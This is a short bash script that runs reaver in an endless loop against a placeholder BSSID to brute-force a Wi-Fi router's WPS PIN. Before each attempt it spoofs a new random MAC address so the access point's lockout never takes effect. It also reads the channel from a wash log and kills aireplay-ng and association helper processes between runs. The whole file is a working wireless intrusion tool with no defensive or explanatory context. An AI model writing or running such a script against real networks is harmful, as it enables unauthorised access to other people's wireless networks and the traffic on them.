#!/bin/bash

while true

do

echo "Y" | reaver -b <BSSID> -m "$(echo '30:A9:DE:2F:D7:'$(cat /proc/sys/kernel/random/uuid | sed 's/[-]//g;s/\(.*\)/\U\1/' | head -c 2) | tee /root/Act-MAC.txt)" -c "$(grep '<BSSID>' /root/wash-log.txt | awk '{print $2}')" -i <iface> -g 1 -l 320 -A -N -vvv -C "kill $(ps aux | grep 'aireplay-ng' | sed -n '1p' | awk '{print $2}') $(ps aux | grep 'auto-assoc-simple' | sed -n '1p' | awk '{print $2}') ; sleep 5d" | tee /root/ReMAC-02.txt | tee -a /root/ReMAC-02-LOG.txt

# cat /root/ReMAC-02.txt >> /root/ReMAC-02-LOG.txt

sleep 2
echo " "
echo "Waiting for the next value, and new attempt!!!!! :D"
echo " "

done
